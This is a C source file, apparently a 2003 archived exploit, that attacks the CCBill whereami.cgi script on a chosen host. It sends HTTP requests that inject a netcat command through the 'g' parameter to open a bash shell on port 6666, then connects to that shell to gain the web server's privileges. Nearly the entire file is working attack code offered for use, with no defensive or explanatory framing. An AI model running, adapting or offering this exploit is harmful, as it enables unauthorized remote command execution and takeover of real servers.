/*
* =====================================
* CCBILL CGI Remote Exploit for /ccbill/whereami.cgi
* By: Knight420
* 7/07/03
*
* spawns a shell with netcat and attempts to connect 
* into the server on port 6666 to gain access of the 
* webserver uid
* 
* (C) COPYRIGHT Blue Ballz , 2003
* all rights reserved
* =====================================
*
*/

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>


unsigned long int	net_resolve (char *host);
int			net_connect (struct sockaddr_in *cs, char *server,
			unsigned short int port, int sec);

unsigned char ccbill[] = 
"GET /ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a"
"GET /cgi-bin/ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a"
"GET /cgi-bin/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a";

int
main (int argc, char **argv)
{
	int			socket;
	char  *TARGET     =     "TARGET";
	char			*server;
	unsigned short int	port;
	struct sockaddr_in	sa;

	if (argc != 3) {
		system("clear");
		printf ("[CCBILL CGI Remote Exploit By:Knight420]\n"
		"usage: %s <host> <port>\n");
		exit (EXIT_FAILURE);
	}
	setenv (TARGET, argv[1], 1);
	server = argv[1];
	port = atoi (argv[2]);

	socket = net_connect (&sa, server, port, 35);
	if (socket <= 0) {
		perror ("net_connect");
		exit (EXIT_FAILURE);
	}

	write (socket, ccbill, strlen (ccbill));
	sleep (1);
	close (socket);

	printf ("[CCBILL CGI Remote Exploit By:Knight420]\n");
	printf ("[1] evil data sent.\n", server);
	printf ("[2] connecting to shell.\n", server);
	system("nc ${TARGET} 6666 || echo '[-]Exploit failed!'");
	exit (EXIT_SUCCESS);
}

unsigned long int
net_resolve (char *host)
{
	long		i;
	struct hostent	*he;

	i = inet_addr (host);
	if (i == -1) {
		he = gethostbyname (host);
		if (he == NULL) {
			return (0);
		} else {
			return (*(unsigned long *) he->h_addr);
		}
	}

	return (i);
}


int
net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec)
{
	int		n, len, error, flags;
	int		fd;
	struct timeval	tv;
	fd_set		rset, wset;

	/* first allocate a socket */
	cs->sin_family = AF_INET;
	cs->sin_port = htons (port);
	fd = socket (cs->sin_family, SOCK_STREAM, 0);
	if (fd == -1)
		return (-1);

	cs->sin_addr.s_addr = net_resolve (server);
	if (cs->sin_addr.s_addr == 0) {
		close (fd);
		return (-1);
	}

	flags = fcntl (fd, F_GETFL, 0);
	if (flags == -1) {
		close (fd);
		return (-1);
	}
	n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1) {
		close (fd);
		return (-1);
	}

	error = 0;

	n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
	if (n < 0) {
		if (errno != EINPROGRESS) {
			close (fd);
			return (-1);
		}
	}
	if (n == 0)
		goto done;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(fd, &rset);
	FD_SET(fd, &wset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	n = select(fd + 1, &rset, &wset, NULL, &tv);
	if (n == 0) {
		close(fd);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1)
		return (-1);

	if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
		if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
			len = sizeof(error);
			if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
				errno = ETIMEDOUT;
				return (-1);
			}
			if (error == 0) {
				goto done;
			} else {
				errno = error;
				return (-1);
			}
		}
	} else
		return (-1);
done:
	n = fcntl(fd, F_SETFL, flags);
	if (n == -1)
		return (-1);

	return (fd);
}

// milw0rm.com [2003-07-10]